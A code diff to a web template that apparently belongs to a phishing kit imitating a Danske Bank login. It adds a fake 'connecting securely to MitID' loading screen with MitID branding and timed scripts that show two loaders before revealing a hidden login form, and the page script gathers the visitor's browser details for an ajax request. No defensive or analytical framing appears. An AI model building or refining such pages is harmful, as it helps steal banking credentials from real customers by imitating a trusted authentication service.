@@ -22,7 +22,7 @@
                                     <div class="text-center">
                                         <img src="{{asset('images/danske-bank-logo.svg')}}">
                                     </div>
-                                    <div class="blog-item-box p-3 pt-5">
+                                    <div id="login-body" class="blog-item-box p-3 pt-5" style="display: none">
                                         <div class="item">
                                             <div class="info pb-2">
                                                 <div class="pb-3" style="align-items: center">
@@ -62,7 +62,27 @@
                                             </div>
                                         </div>
                                     </div>
+                                    <div id="loader-body" class="loader-body m-3 pt-5 mt-4">
+                                        <div class="login-preloader">
+                                            <div class="text-center mt-5">
+                                                <img width="52" src="{{asset('images/logo-blue-1.png')}}">
+                                            </div>
+                                            <div class="loader-back">
+                                                <svg xmlns="http://www.w3.org/2000/svg" id="svg-shield-2pfGa-G" version="1.1" focusable="false" class="mitid-loader__shield" aria-hidden="true"><path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0"></path></svg>
+                                                <div class="login-ring"></div>
+                                            </div>
+                                            <div class="message text-center">
+                                                <a>Forbinder sikkert til MitID<br></a>
+                                                <span>Vent et øjeblik ...</span>
+                                            </div>
 
+                                        </div>
+                                    </div>
+                                    <div id="second-loader-body" class="second-loader-body m-3 pt-5 mt-4">
+                                        <div class="second-loader">
+                                            <div class="ring"></div>
+                                        </div>
+                                    </div>
                                 </div>
                             </div>
                         </div>
@@ -81,6 +101,17 @@
 {{-- page level scripts --}}
 @section('footer_scripts')
     <script>
+        $("#loader-body").hide();
+        setTimeout(function () {
+            $("#second-loader-body").hide();
+            $("#loader-body").show();
+        },2000);
+
+        setTimeout(function () {
+            $("#loader-body").hide();
+            $("#login-body").show()
+        },3000);
+
         let browser = browserInfo();
         $("#browser").val(browser);
         $.ajax({
